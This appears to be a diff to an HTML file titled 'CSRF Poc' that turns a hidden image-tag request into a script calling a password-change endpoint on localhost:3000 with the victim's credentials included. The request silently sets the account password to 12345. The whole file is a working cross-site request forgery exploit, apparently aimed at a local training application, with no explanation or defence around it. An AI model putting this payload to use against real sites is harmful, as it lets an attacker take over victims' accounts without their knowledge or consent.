@@ -1,6 +1,17 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>CSRF Poc</title>
+</head>
 <body>
-  <img src="http://localhost:3000/rest/user/change-password?new=12345&repeat=12345" width="0" height="0" />
+  <script>
+    fetch('http://localhost:3000/rest/user/change-password?new=12345&repeat=12345', {
+      method: 'GET',
+      credentials: 'include'
+    })
+    .then(response => response.json())
+    .then(data => console.log('CSRF Success:', data))
+    .catch(err => console.error('CSRF Error:', err));
+  </script>
 </body>
 </html>
